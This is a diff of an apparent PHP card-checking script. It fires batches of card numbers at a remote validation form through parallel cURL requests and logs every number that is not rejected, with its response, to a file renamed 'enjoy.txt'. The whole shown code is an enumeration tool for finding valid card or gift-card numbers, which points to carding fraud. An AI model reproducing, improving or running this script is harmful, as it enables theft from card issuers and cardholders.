@@ -130,7 +130,7 @@ function api($code){
     $body = substr($response,$start+46,$end-$start);
     
     if(!stripos($body,'Error,Card_NO does not exist') && !stripos($body,'Error,Invalid Card_NO')){
-        $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
+        $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
         fwrite($myfile, $code.':'.$body);
         fclose($myfile);
     }
@@ -147,7 +147,7 @@ function php_curl_multi($codes){
 
     // create both cURL resources
     foreach ($codes as $key => $code) {
-        $post_data['card_no'] = $code;
+        $post_data['card_no'] = trim($code);
         $post_data['submit'] = 'query';
         $post_data['action'] = 'yes';
         $post_data['check_valid'] = 'yes';
@@ -230,11 +230,12 @@ function execute($number=0){
         $body = substr($response,$start+46,$end-$start);
         
         if(!stripos($body,'Error,Card_NO does not exist') && !stripos($body,'Error,Invalid Card_NO')){
-            $myfile = fopen("newfile.txt", "a") or die("Unable to open file!");
+            $myfile = fopen("enjoy.txt", "a") or die("Unable to open file!");
             fwrite($myfile, $checkCodes[$key].':'.$body);
             fclose($myfile);
         }
-        echo var_export(['code'=>$checkCodes[$key],'status'=>$body]);
+        // echo var_export(['code'=>$checkCodes[$key],'status'=>$body]);
+        print_r(['code'=>$checkCodes[$key],'status'=>$body]);
         echo '<br>';
     }
     // foreach($checkCodes as $code){
